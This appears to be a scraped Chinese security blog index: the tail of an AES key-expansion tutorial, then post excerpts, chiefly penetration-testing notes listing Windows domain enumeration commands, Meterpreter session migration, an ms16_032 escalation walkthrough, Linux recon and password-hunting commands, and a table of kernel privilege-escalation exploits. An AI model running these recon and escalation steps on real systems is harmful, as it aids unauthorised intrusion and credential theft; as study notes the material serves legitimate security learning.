<th>2B</th>
</tr>
</thead>
<tbody><tr>
<td>7A</td>
<td>F2</td>
<td>78</td>
<td>6E</td>
</tr>
<tr>
<td>63</td>
<td>9C</td>
<td>26</td>
<td>67</td>
</tr>
<tr>
<td>B0</td>
<td>A7</td>
<td>82</td>
<td>E5</td>
</tr>
</tbody></table>
<p>下面，进行列混合运算：<br>以第一列的运算为例：</p>
<p><img src="https://i.loli.net/2021/03/16/AhZwsVkdbJMjf3W.png" alt="col7"></p>
<p>其它列的计算就不列举了，列混合后生成的新状态矩阵如下：</p>
<table>
<thead>
<tr>
<th>D4</th>
<th>E7</th>
<th>CD</th>
<th>66</th>
</tr>
</thead>
<tbody><tr>
<td>28</td>
<td>02</td>
<td>E5</td>
<td>BB</td>
</tr>
<tr>
<td>BE</td>
<td>C6</td>
<td>D6</td>
<td>BF</td>
</tr>
<tr>
<td>22</td>
<td>0F</td>
<td>DF</td>
<td>A5</td>
</tr>
</tbody></table>
<h3 id="列混合逆运算"><a href="#列混合逆运算" class="headerlink" title="列混合逆运算"></a>列混合逆运算</h3><p>逆向列混合变换可由下图的矩阵乘法定义：</p>
<p><img src="https://i.loli.net/2021/03/16/oJbPNnvGU13Kie7.png" alt="col6"></p>
<p>可以验证，逆变换矩阵同正变换矩阵的乘积恰好为单位矩阵。</p>
<h2 id="轮密钥加"><a href="#轮密钥加" class="headerlink" title="轮密钥加"></a>轮密钥加</h2><p>轮密钥加是将128位轮密钥Ki同状态矩阵中的数据进行逐位异或操作，如下图所示。其中，密钥Ki中每个字W[4i],W[4i+1],W[4i+2],W[4i+3]为32位比特字，包含4个字节，他们的生成算法下面在下面介绍。轮密钥加过程可以看成是字逐位异或的结果，也可以看成字节级别或者位级别的操作。也就是说，可以看成S0 S1 S2 S3 组成的32位字与W[4i]的异或运算。</p>
<p><img src="https://i.loli.net/2021/03/16/m1bFspPf2oqSKvD.jpg" alt="roundadd"></p>
<p>轮密钥加的逆运算同正向的轮密钥加运算完全一致，这是因为异或的逆操作是其自身。轮密钥加非常简单，但却能够影响S数组中的每一位。</p>
<h2 id="密钥扩展"><a href="#密钥扩展" class="headerlink" title="密钥扩展"></a>密钥扩展</h2><p>AES首先将初始密钥输入到一个4*4的状态矩阵中，如下图所示。</p>
<p><img src="https://i.loli.net/2021/03/16/Qf6LJzjmxn4O7YN.jpg" alt="keyextends"></p>
<p>这个4*4矩阵的每一列的4个字节组成一个字，矩阵4列的4个字依次命名为W[0]、W[1]、W[2]和W[3]，它们构成一个以字为单位的数组W。例如，设密钥K为”abcdefghijklmnop”,则K0 = ‘a’,K1 = ‘b’, K2 = ‘c’,K3 = ‘d’,W[0] = “abcd”。<br>接着，对W数组扩充40个新列，构成总共44列的扩展密钥数组。新列以如下的递归方式产生：<br>1.如果i不是4的倍数，那么第i列由如下等式确定：<br>W[i]=W[i-4]⨁W[i-1]<br>2.如果i是4的倍数，那么第i列由如下等式确定：<br>W[i]=W[i-4]⨁T(W[i-1])<br>其中，T是一个有点复杂的函数。<br>函数T由3部分组成：字循环、字节代换和轮常量异或，这3部分的作用分别如下。<br>a.字循环：将1个字中的4个字节循环左移1个字节。即将输入字[b0, b1, b2, b3]变换成[b1,b2,b3,b0]。<br>b.字节代换：对字循环的结果使用S盒进行字节代换。<br>c.轮常量异或：将前两步的结果同轮常量Rcon[j]进行异或，其中j表示轮数。<br>轮常量Rcon[j]是一个字，其值见下表。</p>
<table>
<thead>
<tr>
<th>j</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
</tr>
</thead>
<tbody><tr>
<td>Rcon[j]</td>
<td>01 00 00 00</td>
<td>02 00 00 00</td>
<td>04 00 00 00</td>
<td>08 00 00 00</td>
<td>10 00 00 00</td>
</tr>
<tr>
<td>j</td>
<td>6</td>
<td>7</td>
<td>8</td>
<td>9</td>
<td>10</td>
</tr>
<tr>
<td>Rcon[j]</td>
<td>20 00 00 00</td>
<td>40 00 00 00</td>
<td>80 00 00 00</td>
<td>1B 00 00 00</td>
<td>36 00 00 00</td>
</tr>
</tbody></table>
<p>下面举个例子：<br>设初始的128位密钥为：<br>3C A1 0B 21 57 F0 19 16 90 2E 13 80 AC C1 07 BD<br>那么4个初始值为：<br>W[0] = 3C A1 0B 21<br>W[1] = 57 F0 19 16<br>W[2] = 90 2E 13 80<br>W[3] = AC C1 07 BD<br>下面求扩展的第1轮的子密钥(W[4],W[5],W[6],W[7])。<br>由于4是4的倍数，所以：<br>W[4] = W[0] ⨁ T(W[3])<br>T(W[3])的计算步骤如下：</p>
<ol>
<li><p>循环地将W[3]的元素移位：AC C1 07 BD变成C1 07 BD AC; </p>
</li>
<li><p>将 C1 07 BD AC 作为S盒的输入，输出为78 C5 7A 91;</p>
</li>
<li><p>将78 C5 7A 91与第一轮轮常量Rcon[1]进行异或运算，将得到79 C5 7A 91，因此，T(W[3])=79 C5 7A 91，故<br>W[4] = 3C A1 0B 21 ⨁ 79 C5 7A 91 = 45 64 71 B0<br>其余的3个子密钥段的计算如下：<br>W[5] = W[1] ⨁ W[4] = 57 F0 19 16 ⨁ 45 64 71 B0 = 12 94 68 A6<br>W[6] = W[2] ⨁ W[5] =90 2E 13 80 ⨁ 12 94 68 A6 = 82 BA 7B 26<br>W[7] = W[3] ⨁ W[6] = AC C1 07 BD ⨁ 82 BA 7B 26 = 2E 7B 7C 9B<br>所以，第一轮的密钥为 45 64 71 B0 12 94 68 A6 82 BA 7B 26 2E 7B 7C 9B。</p>
</li>
</ol>
<h1 id="AES解密"><a href="#AES解密" class="headerlink" title="AES解密"></a>AES解密</h1><p>在文章开始的图中，有AES解密的流程图，可以对应那个流程图来进行解密。下面介绍的是另一种等价的解密模式，流程图如下图所示。这种等价的解密模式使得解密过程各个变换的使用顺序同加密过程的顺序一致，只是用逆变换取代原来的变换。</p>
<p><img src="https://i.loli.net/2021/03/16/fy5a3BucD4Y8e2S.jpg" alt="deaes"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://goudanjun.vip/2021/03/13/资料汇总.html/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="狗蛋菌">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Goudan's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/03/13/资料汇总.html/" itemprop="url">资料汇总</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-03-13T15:49:14+08:00">
                2021-03-13
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  25.9k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  112 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h2 id="项目简介"><a href="#项目简介" class="headerlink" title="项目简介"></a><strong>项目简介</strong></h2><p><strong><em>\</em>一个 Red Team 攻击的生命周期，整个生命周期包括：信息收集、攻击尝试获得权限、持久性控制、权限提升、网络信息收集、横向移动、数据分析（在这个基础上再做持久化控制）、在所有攻击结束之后清理并退出战场。**</strong></p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2021/03/13/资料汇总.html/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://goudanjun.vip/2021/03/12/Fastjson漏洞复现和研究.html/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="狗蛋菌">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Goudan's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/03/12/Fastjson漏洞复现和研究.html/" itemprop="url">Fastjson漏洞复现和研究</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-03-12T22:51:22+08:00">
                2021-03-12
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  821 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  3 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>Fastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。</p>
<p>Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2021/03/12/Fastjson漏洞复现和研究.html/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://goudanjun.vip/2021/03/11/sql注入报错函数总结.html/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="狗蛋菌">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Goudan's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/03/11/sql注入报错函数总结.html/" itemprop="url">sql注入报错函数总结</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-03-11T16:52:53+08:00">
                2021-03-11
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  175 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="关于SQL注入的五大报错注入函数"><a href="#关于SQL注入的五大报错注入函数" class="headerlink" title="关于SQL注入的五大报错注入函数"></a>关于SQL注入的五大报错注入函数</h1><p>全部都以查user()为例子</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2021/03/11/sql注入报错函数总结.html/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://goudanjun.vip/2021/03/10/PowerShell学习全记录.html/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="狗蛋菌">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Goudan's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/03/10/PowerShell学习全记录.html/" itemprop="url">PowerShell学习全记录</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-03-10T09:56:23+08:00">
                2021-03-10
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  593 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h1>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2021/03/10/PowerShell学习全记录.html/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://goudanjun.vip/2021/03/08/内网学习记录.html/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="狗蛋菌">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Goudan's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/03/08/内网学习记录.html/" itemprop="url">内网学习记录</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-03-08T19:36:50+08:00">
                2021-03-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  3k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  17 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">net user /domain		<span class="comment">#查看域用户</span></span><br><span class="line">net view /domain		<span class="comment">#查看有几个域</span></span><br><span class="line">net view /domain:XXX	<span class="comment">#查看域内主机</span></span><br><span class="line">net group /domain		<span class="comment">#查看域里面的组</span></span><br><span class="line">net group <span class="string">"domain computers"</span> /domain	<span class="comment">#查看域内所有主机名</span></span><br><span class="line">net group <span class="string">"domain admins"</span> /domain		<span class="comment">#查看域管理员</span></span><br><span class="line">net group <span class="string">"domain controllers"</span> /domain	<span class="comment">#查看域控制器</span></span><br><span class="line">net group <span class="string">"enterprise admins"</span> /domain	<span class="comment">#查看企业管理组</span></span><br><span class="line">nettime /domain			<span class="comment">#查看时间服务器</span></span><br></pre></td></tr></table></figure>

<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>提权之前：第一次getshell的时候要进行进程的迁移，进而获取稳定的shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#手动迁移</span></span><br><span class="line">migrate &lt;PID&gt;</span><br><span class="line"><span class="comment">#自动迁移</span></span><br><span class="line">run post/windows/manage/migrate</span><br></pre></td></tr></table></figure>

<h2 id="windows各漏洞对应补丁："><a href="#windows各漏洞对应补丁：" class="headerlink" title="windows各漏洞对应补丁："></a>windows各漏洞对应补丁：</h2><p><img src="https://i.loli.net/2021/03/08/bWeiuH2Cl9Xnmcw.jpg" alt="IMG_0726(20210308-110246)"><img src="https://i.loli.net/2021/03/08/2cKIuaoPyVNTCZl.jpg" alt="IMG_0727(20210308-110307)"></p>
<h3 id="ms16-032实验："><a href="#ms16-032实验：" class="headerlink" title="ms16_032实验："></a>ms16_032实验：</h3><p>getshell后是用户权限：</p>
<p><img src="https://i.loli.net/2021/03/08/jgHM8fcr5Eo7KlW.png" alt="image-20210308204554539"></p>
<p>将这个session放到后台运行，搜索ms16032，设置session为刚才的session</p>
<p><img src="https://i.loli.net/2021/03/08/gPA3LD7CSu2Bf1m.png" alt="image-20210308204708951"></p>
<p>提权后：</p>
<p><img src="https://i.loli.net/2021/03/08/Rev19GBgq4OVA2E.png" alt="image-20210308204751797"></p>
<h2 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h2><h3 id="0x00-常⻅信息收集命令"><a href="#0x00-常⻅信息收集命令" class="headerlink" title="0x00 常⻅信息收集命令"></a><strong>0x00 常⻅信息收集命令</strong></h3><table>
<thead>
<tr>
<th align="left">命令</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td align="left">uname -a</td>
<td>打印所有可⽤的系统信息</td>
</tr>
<tr>
<td align="left">cat /proc/version</td>
<td>内核版本信息</td>
</tr>
<tr>
<td align="left">cat /etc/*-release(issues)</td>
<td>Linux发行版本信息</td>
</tr>
<tr>
<td align="left">df -a</td>
<td>文件系统信息</td>
</tr>
<tr>
<td align="left">dpkg –list 2&gt;/dev/null| grep compiler |grep -v decompiler 2&gt;/dev/null &amp;&amp; yum list installed ‘gcc*’ 2&gt;/dev/null| grep gcc 2&gt;/dev/null</td>
<td>列出可用的编辑器</td>
</tr>
<tr>
<td align="left">lpstat -a</td>
<td>查看是否有打印机</td>
</tr>
<tr>
<td align="left">ps auxtop cat/etc/service</td>
<td>查看进程相关信息</td>
</tr>
<tr>
<td align="left">crontab -l；ls -alh /var/spool/cron；ls -al /etc/ | grep cron；ls -al /etc/cron<em>cat /etc/cron</em>；cat /etc/at.allow；cat /etc/at.deny；cat /etc/cron.allow；cat /etc/cron.deny；cat /etc/crontab；cat /etc/anacrontab；cat /var/spool/cron/crontabs/root</td>
<td>查看计划任务的相关信息</td>
</tr>
<tr>
<td align="left">grep -i user [filename]；grep -i pass [filename；]grep -C 5 “password” [filename]；find . -name “*.php” -print0 | xargs -0 grep-i -n “var $password”</td>
<td>查看可能具有⼝令的⽂件</td>
</tr>
</tbody></table>
<h3 id="0x01-sudo滥⽤提权"><a href="#0x01-sudo滥⽤提权" class="headerlink" title="0x01 sudo滥⽤提权"></a><strong>0x01 sudo滥⽤提权</strong></h3><p>使⽤sudo -l命令可以查看当前⽤户允许执⾏的提权命令。</p>
<h3 id="0x02-内核漏洞提权"><a href="#0x02-内核漏洞提权" class="headerlink" title="0x02 内核漏洞提权"></a><strong>0x02 内核漏洞提权</strong></h3><p>Linux漏洞汇总（通过ExDB查找PoC）</p>
<table>
<thead>
<tr>
<th>发布时间</th>
<th>漏洞描述</th>
<th>发布作者</th>
</tr>
</thead>
<tbody><tr>
<td>2019/12/16</td>
<td>Linux 5.3 - PrivilegeEscalation via io_uringOffload of sendmsg() ontoKernel Thread with KernelCreds</td>
<td>Google Security Research</td>
</tr>
<tr>
<td>2019/10/24</td>
<td>Linux Polkit - pkexec helperPTRACE_TRACEME localroot (Metasploit)</td>
<td>Metasploit</td>
</tr>
<tr>
<td>2019/07/17</td>
<td>Linux - Broken Permissionand Object Lifetime Handlingfor PTRACE_TRACEME</td>
<td>Google Security Research</td>
</tr>
<tr>
<td>2018/11/29</td>
<td>Linux - Nested UserNamespace idmap LimitLocal Privilege Escalation(Metasploit)</td>
<td>Metasploit</td>
</tr>
<tr>
<td>2018/11/16</td>
<td>Linux - Broken uid/gidMapping for Nested UserNamespaces</td>
<td>Google Security Research</td>
</tr>
<tr>
<td>2018/09/26</td>
<td>Linux Kernel - VMA Use-After-Free via Buggyvmacache_flush_all()Fastpath Local PrivilegeEscalation</td>
<td>Google Security Research</td>
</tr>
<tr>
<td>2018/08/03</td>
<td>Linux Kernel - UDPFragmentation Offset ‘UFO’Privilege Escalation(Metasploit)</td>
<td>Metasploit</td>
</tr>
<tr>
<td>2018/07/19</td>
<td>Linux - BPF Sign ExtensionLocal Privilege Escalation(Metasploit)</td>
<td>Metasploit</td>
</tr>
<tr>
<td>2018/07/10</td>
<td>Linux Kernel &lt; 4.13.9(Ubuntu 16.04 / Fedora 27) -Local Privilege Escalation</td>
<td>rlarabee</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>2018/05/22</th>
<th>Linux 4.4.0 &lt; 4.4.0-53 -‘AF_PACKET chocobo_root’Local Privilege Escalation(Metasploit)</th>
<th>Metasploit</th>
</tr>
</thead>
<tbody><tr>
<td>2018/05/21</td>
<td>Linux 2.6.30 &lt; 2.6.36-rc8 -Reliable Datagram Sockets(RDS) Privilege Escalation(Metasploit)</td>
<td>Metasploit</td>
</tr>
<tr>
<td>2018/05/18</td>
<td>Linux 4.8.0 &lt; 4.8.0-46 -AF_PACKET packet_set_ringPrivilege Escalation(Metasploit)</td>
<td>Metasploit</td>
</tr>
<tr>
<td>2017/08/13</td>
<td>Linux Kernel &lt; 4.4.0-83 / &lt;4.8.0-58 (Ubuntu14.04/16.04) - LocalPrivilege Escalation (KASLR/ SMEP)</td>
<td>Andrey Konovalov</td>
</tr>
<tr>
<td>2017/09/06</td>
<td>Tor (Linux) - X11 LinuxSandbox Breakout</td>
<td>Google Security Research</td>
</tr>
<tr>
<td>2017/05/22</td>
<td>VMware Workstation forLinux 12.5.2 build-4638234- ALSA Configuration HostLocal Privilege Escalation</td>
<td></td>
</tr>
<tr>
<td>2017/05/11</td>
<td>Linux Kernel 4.8.0-41-generic (Ubuntu) - PacketSocket Local PrivilegeEscalation</td>
<td>Andrey Konovalov</td>
</tr>
<tr>
<td>2016/11/27</td>
<td>Linux Kernel 2.6.22 &lt; 3.9 -‘Dirty COW /proc/self/mem’Race Condition PrivilegeEscalation (/etc/passwdMethod)</td>
<td>Gabriele Bonacini</td>
</tr>
<tr>
<td>2016/11/28</td>
<td>Linux Kernel 2.6.22 &lt; 3.9 -‘Dirty COW’’PTRACE_POKEDATA’ RaceCondition PrivilegeEscalation (/etc/passwdMethod)</td>
<td>FireFart</td>
</tr>
<tr>
<td>2016/11/14</td>
<td>Linux Kernel 4.4 (Ubuntu16.04) - ‘BPF’ Local PrivilegeEscalation (Metasploit)</td>
<td>Metasploit</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>2016/11/02</th>
<th>Linux Kernel (Ubuntu /Fedora / RedHat) -‘Overlayfs’ Local PrivilegeEscalation (Metasploit)</th>
<th>Metasploit</th>
</tr>
</thead>
<tbody><tr>
<td>2016/10/21</td>
<td>Linux Kernel 2.6.22 &lt; 3.9(x86/x64) - ‘Dirty COW/proc/self/mem’ RaceCondition PrivilegeEscalation (SUID Method)</td>
<td>Robin Verton</td>
</tr>
<tr>
<td>2016/10/19</td>
<td>Linux Kernel 2.6.22 &lt; 3.9 -‘Dirty COW’ /proc/self/memRace Condition (WriteAccess Method)</td>
<td>Phil Oester</td>
</tr>
<tr>
<td>2016/10/11</td>
<td>Linux Kernel 3.13.1 -‘Recvmmsg’ Local PrivilegeEscalation (Metasploit)</td>
<td>Metasploit</td>
</tr>
<tr>
<td>2016/06/21</td>
<td>Linux Kernel - ‘ecryptfs’’/proc/$pid/environ’ LocalPrivilege Escalation</td>
<td>Google Security Research</td>
</tr>
<tr>
<td>2016/05/04</td>
<td>Linux Kernel 4.4.x (Ubuntu16.04) - ‘double-fdput()’bpf(BPF_PROG_LOAD)Privilege Escalation</td>
<td>Google Security Research</td>
</tr>
<tr>
<td>2016/05/04</td>
<td>Linux Kernel (Ubuntu14.04.3) -‘perf_event_open()’ Can Racewith execve() (Access/etc/shadow)</td>
<td>Google Security Research</td>
</tr>
<tr>
<td>2014/05/28</td>
<td>Linux Kernel 3.3.5 -‘/drivers/media/media-device.c’ Local InformationDisclosure</td>
<td>Salva Peiro</td>
</tr>
<tr>
<td>2016/01/05</td>
<td>Linux Kernel 4.3.3 (Ubuntu14.04/15.10) - ‘overlayfs’Local Privilege Escalation (1)</td>
<td>rebel</td>
</tr>
<tr>
<td>2013/06/07</td>
<td>Linux Kernel 3.3.5 - ‘b43’Wireless Driver PrivilegeEscalation</td>
<td>Kees Cook</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>2015/10/15</th>
<th>Linux Kernel 3.17 - ‘Pythonctypes and memfd_create’noexec File Security Bypass</th>
<th>soyer</th>
</tr>
</thead>
<tbody><tr>
<td>2013/03/13</td>
<td>Linux Kernel 3.0 &lt; 3.3.5 -‘CLONE_NEWUSER|CLONE_FS’ Local Privilege Escalation</td>
<td>Sebastian Krahmer</td>
</tr>
<tr>
<td>2012/10/09</td>
<td>Linux Kernel 3.2.x -‘uname()’ System Call LocalInformation Disclosure</td>
<td>Brad Spengler</td>
</tr>
<tr>
<td>2012/07/26</td>
<td>Linux Kernel 2.6.x -‘rds_recvmsg()’ LocalInformation Disclosure</td>
<td>Jay Fenlason</td>
</tr>
<tr>
<td>2015/06/16</td>
<td>Linux Kernel 3.13.0 &lt; 3.19(Ubuntu12.04/14.04/14.10/15.04) -‘overlayfs’ Local PrivilegeEscalation (Access/etc/shadow)</td>
<td></td>
</tr>
<tr>
<td>2015/06/16</td>
<td>Linux Kernel 3.13.0 &lt; 3.19(Ubuntu12.04/14.04/14.10/15.04) -‘overlayfs’ Local PrivilegeEscalation</td>
<td>rebel</td>
</tr>
<tr>
<td>2011/11/07</td>
<td>Linux Kernel 3.0.4 -‘/proc/interrupts’ PasswordLength Local InformationDisclosure</td>
<td>Vasiliy Kulikov</td>
</tr>
<tr>
<td>2012/01/12</td>
<td>Linux Kernel 2.6.39 &lt; 3.2.2(x86/x64) - ‘Mempodipper’Local Privilege Escalation (2)</td>
<td>zx2c4</td>
</tr>
<tr>
<td>2014/10/20</td>
<td>Linux PolicyKit - RaceCondition PrivilegeEscalation (Metasploit)</td>
<td>Metasploit</td>
</tr>
<tr>
<td>2010/11/09</td>
<td>Linux Kernel 2.6.x -‘net/core/filter.c’ LocalInformation Disclosure</td>
<td>Dan Rosenberg</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>2010/05/18</th>
<th>Linux Kernel 2.6.x - BtrfsCloned File Security Bypass</th>
<th>Dan Rosenberg</th>
</tr>
</thead>
<tbody><tr>
<td>2014/06/21</td>
<td>Linux Kernel 3.13 - SGIDPrivilege Escalation</td>
<td>Vitaly Nikolenko</td>
</tr>
<tr>
<td>2009/12/16</td>
<td>Linux Kernel &lt; 2.6.28 -‘fasync_helper()’ LocalPrivilege Escalation</td>
<td>Tavis Ormandy</td>
</tr>
<tr>
<td>2009/11/09</td>
